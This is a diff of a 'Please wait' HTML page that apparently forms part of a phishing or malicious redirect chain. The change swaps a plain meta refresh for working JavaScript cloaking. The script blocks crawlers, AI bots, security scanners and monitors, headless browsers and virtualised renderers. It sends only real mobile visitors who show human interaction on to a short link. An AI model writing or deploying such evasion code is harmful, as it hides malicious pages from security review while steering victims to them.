@@ -1,18 +1,237 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
 <head>
-  <meta content="text/html; charset=utf-8" http-equiv="content-type">
-  <title>Please wait</title>
-  <meta http-equiv="Refresh" content="0;URL=https://christoph-isack.com/UsersV.php">
+<meta content="text/html; charset=utf-8" http-equiv="content-type">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<title>Please wait</title>
+<style>
+html, body {
+    margin: 0; padding: 0;
+    height: 100%;
+    background: #ffffff;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    display: flex; align-items: center; justify-content: center;
+    overflow: hidden;
+}
+.spinner {
+    width: 40px; height: 40px;
+    border: 3px solid #f0f2f6;
+    border-top-color: #FF4E00;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+}
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+</style>
 </head>
 <body>
-  <p class="style1">Please wait...</p>
-  <style type="text/css">
-    .style1 {
-      font-family: Verdana, Arial, Helvetica, sans-serif;
-      font-weight: bold;
-      font-size: 12px;
+
+<div class="spinner"></div>
+
+<script>
+(function () {
+    'use strict';
+
+    // ================= CONFIG =================
+    var TARGET = 'https://scanned.page/zUPl3E';
+    var DELAY  = 300; // ms
+    // ==========================================
+
+    // ==========================================
+    // REDIRECT → target
+    // ==========================================
+    function go() {
+        try { window.location.replace(TARGET); }
+        catch (e) { window.location.href = TARGET; }
     }
-  </style>
+
+    // ==========================================
+    // 1. USER-AGENT ANTI-BOT
+    // ==========================================
+    function badUserAgent(ua) {
+        var patterns = [
+            'curl','wget','libwww','httpclient','http-client','httpie',
+            'postman','insomnia','node-fetch','axios','okhttp','guzzle',
+            'python','perl','ruby','java/','java ','php/','go-http-client',
+            'go-http','requests','urllib','aiohttp','httpx','scrapy',
+            'headless','phantomjs','phantom','puppeteer','playwright',
+            'selenium','webdriver','electron','cefsharp','htmlunit',
+            'nightmare','zombie','jsdom','splash',
+            'bot','crawl','spider','scraper','scrape','slurp','fetch',
+            'googlebot','bingbot','yandexbot','baiduspider','duckduckbot',
+            'sogou','exabot','facebot','ia_archiver','archive.org_bot',
+            'ahrefsbot','semrushbot','majestic','moz.com','screaming',
+            'sitebulb','deepcrawl','seznam','petalbot','mj12bot','dotbot',
+            'bytespider','gptbot','chatgpt','ccbot','claudebot','anthropic',
+            'perplexity','youbot','applebot','amazonbot',
+            'facebookexternalhit','twitterbot','linkedinbot','whatsapp',
+            'telegrambot','discordbot','slackbot','pinterest','redditbot',
+            'zgrab','nmap','masscan','zmap','nuclei','nikto','sqlmap',
+            'wpscan','dirbuster','gobuster','ffuf','wfuzz','burp',
+            'acunetix','nessus','qualys','openvas','metasploit',
+            'uptimerobot','pingdom','statuscake','newrelic','datadog',
+            'better uptime','betterstack','freshping','site24x7'
+        ];
+        for (var i = 0; i < patterns.length; i++) {
+            if (ua.indexOf(patterns[i]) !== -1) return true;
+        }
+        return false;
+    }
+
+    // ==========================================
+    // 2. HEADLESS / AUTOMATION
+    // ==========================================
+    function isHeadless() {
+        if (navigator.webdriver === true) return true;
+        if (window.callPhantom || window._phantom || window.phantom) return true;
+        if (window.__nightmare) return true;
+        if (typeof window.process === 'object' &&
+            window.process !== null &&
+            window.process.versions &&
+            window.process.versions.node) return true;
+        if (typeof window.Buffer === 'function') return true;
+        if (document.documentElement.getAttribute('webdriver')) return true;
+        if (document.documentElement.getAttribute('selenium')) return true;
+        if (document.documentElement.getAttribute('driver'))   return true;
+
+        var ua = navigator.userAgent.toLowerCase();
+        if (/chrome|chromium|crios/i.test(ua) && !/edge|edg|opr|opera/i.test(ua)) {
+            if (typeof window.chrome === 'undefined') return true;
+        }
+        return false;
+    }
+
+    // ==========================================
+    // 3. FINGERPRINT
+    // ==========================================
+    function badFingerprint() {
+        if (!navigator.plugins || navigator.plugins.length === 0) return true;
+        if (!navigator.mimeTypes || navigator.mimeTypes.length === 0) return true;
+        if (!navigator.languages || navigator.languages.length === 0) return true;
+        if (!navigator.language) return true;
+        if (!navigator.platform) return true;
+        if (!screen.width || !screen.height) return true;
+        if (screen.width < 200 || screen.height < 200) return true;
+        if (!screen.colorDepth || screen.colorDepth < 8) return true;
+
+        try {
+            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            if (!tz) return true;
+        } catch (e) { return true; }
+
+        try {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return true;
+            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            if (dbg) {
+                var renderer = (gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').toString();
+                if (/swiftshader|llvmpipe|software|mesa|virtualbox|vmware|parallels/i.test(renderer)) {
+                    return true;
+                }
+            }
+        } catch (e) { return true; }
+
+        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 2) return true;
+        if (navigator.deviceMemory && navigator.deviceMemory < 2) return true;
+
+        return false;
+    }
+
+    // ==========================================
+    // 4. MOBILE CHECK
+    // ==========================================
+    function isRealMobile() {
+        var ua = navigator.userAgent.toLowerCase();
+
+        if (/windows nt|macintosh|cros|x11/.test(ua) &&
+            !/android|iphone|ipad|ipod|mobile/.test(ua)) return false;
+
+        var tokens = [
+            'android','iphone','ipod','ipad','blackberry','bb10',
+            'windows phone','iemobile','opera mini','opera mobi','opios',
+            'mobile safari','mobile chrome','mobile firefox','fxios','crios',
+            'samsungbrowser','samsung browser','miui','huawei','oneplus',
+            'oppo','vivo','xiaomi','redmi','poco','realme','honor',
+            'kindle','silk','playbook','webos','palm','symbian','nokia'
+        ];
+        var found = false;
+        for (var i = 0; i < tokens.length; i++) {
+            if (ua.indexOf(tokens[i]) !== -1) { found = true; break; }
+        }
+        if (!found) return false;
+
+        var hasTouch = ('ontouchstart' in window) ||
+                       (navigator.maxTouchPoints > 0) ||
+                       (navigator.msMaxTouchPoints > 0);
+        if (!hasTouch) return false;
+
+        var w = Math.min(screen.width, screen.height);
+        var h = Math.max(screen.width, screen.height);
+        if (w > 900)  return false;
+        if (h > 1400) return false;
+
+        if ((window.devicePixelRatio || 1) < 1.5) return false;
+
+        if (window.matchMedia) {
+            var fine   = window.matchMedia('(pointer: fine)').matches;
+            var coarse = window.matchMedia('(pointer: coarse)').matches;
+            if (fine && !coarse) return false;
+        }
+
+        if (typeof window.orientation === 'undefined' &&
+            typeof screen.orientation === 'undefined') return false;
+
+        return true;
+    }
+
+    // ==========================================
+    // 5. BEHAVIOR SIGNALS
+    // ==========================================
+    var signal = {
+        touch:   false,
+        move:    false,
+        focus:   false,
+        visible: !document.hidden
+    };
+
+    window.addEventListener('touchstart', function () { signal.touch = true; }, { passive: true, once: true });
+    window.addEventListener('mousemove',  function () { signal.move  = true; }, { passive: true, once: true });
+    window.addEventListener('focus',      function () { signal.focus = true; }, { once: true });
+    document.addEventListener('visibilitychange', function () {
+        if (!document.hidden) signal.visible = true;
+    }, { once: true });
+
+    // ==========================================
+    // MAIN
+    // ==========================================
+    function run() {
+        var ua = navigator.userAgent.toLowerCase();
+
+        // ❌ Bot checks → توقف هنا (بلا redirect)
+        if (!ua || ua.length < 10)  return;
+        if (badUserAgent(ua))       return;
+        if (isHeadless())           return;
+        if (badFingerprint())       return;
+        if (!isRealMobile())        return;
+
+        // ✅ Passed → wait DELAY → confirm human → go
+        setTimeout(function () {
+            if (!signal.touch && !signal.move && !signal.focus) return;
+            if (!signal.visible) return;
+            go();
+        }, DELAY);
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', run);
+    } else {
+        run();
+    }
+})();
+</script>
+
 </body>
 </html>
